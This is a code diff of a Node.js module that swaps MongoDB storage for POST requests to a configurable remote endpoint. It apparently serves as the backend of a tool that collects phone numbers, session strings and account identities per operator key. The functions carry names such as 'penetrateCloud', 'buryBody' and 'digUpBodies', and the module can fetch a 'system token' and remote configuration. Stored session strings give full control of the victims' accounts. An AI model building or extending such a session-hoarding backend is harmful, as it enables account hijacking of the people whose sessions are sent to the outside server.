@@ -1,52 +1,53 @@
-const mongoose = require('mongoose');
-const chalk = require('chalk');
+const axios = require('axios');
 
-const soulSchema = new mongoose.Schema({
-  phone: { type: String, required: true },
-  session: { type: String, required: true },
-  owner: { type: String, required: true, index: true },
-  username: String,
-  uid: String,
-  created: { type: Date, default: Date.now }
-});
+let API_ENDPOINT = "";
 
-soulSchema.index({ phone: 1, owner: 1 }, { unique: true });
+const initStorage = (url) => {
+    API_ENDPOINT = url;
+};
 
-const Soul = mongoose.model('Soul', soulSchema);
+const callApi = async (action, key, payload = {}) => {
+    try {
+        const { data } = await axios.post(API_ENDPOINT, {
+            action,
+            key,
+            payload
+        });
+        return data;
+    } catch (e) {
+        throw new Error('Cloud Uplink Failed');
+    }
+};
 
-const penetrateCloud = async (uri) => {
-  try {
-    await mongoose.connect(uri);
-    return true;
-  } catch (e) {
-    return false;
-  }
+const getSystemToken = async (ownerKey) => {
+    try {
+        const res = await callApi('get_sys_token', ownerKey);
+        return res.token;
+    } catch (e) {
+        return null;
+    }
 };
 
 const buryBody = async (phone, session, me, ownerKey) => {
-  const exists = await Soul.findOne({ phone: phone, owner: ownerKey });
-  if (exists) {
-    exists.session = session;
-    exists.username = me.username || 'Anon';
-    exists.uid = me.id.toString();
-    await exists.save();
-  } else {
-    await new Soul({
-      phone,
-      session,
-      owner: ownerKey,
-      username: me.username || 'Anon',
-      uid: me.id.toString()
-    }).save();
-  }
+    await callApi('bury', ownerKey, { phone, session, me });
 };
 
 const digUpBodies = async (ownerKey) => {
-  return await Soul.find({ owner: ownerKey });
+    const res = await callApi('dig', ownerKey);
+    return res.souls || [];
 };
 
 const burnBody = async (phone, ownerKey) => {
-  await Soul.deleteOne({ phone: phone, owner: ownerKey });
+    await callApi('burn', ownerKey, { phone });
 };
 
-module.exports = { penetrateCloud, buryBody, digUpBodies, burnBody };
+const getCloudConfig = async (ownerKey) => {
+    const res = await callApi('get_config', ownerKey);
+    return res.settings;
+};
+
+const setCloudConfig = async (ownerKey, data) => {
+    await callApi('set_config', ownerKey, data);
+};
+
+module.exports = { initStorage, getSystemToken, buryBody, digUpBodies, burnBody, getCloudConfig, setCloudConfig };
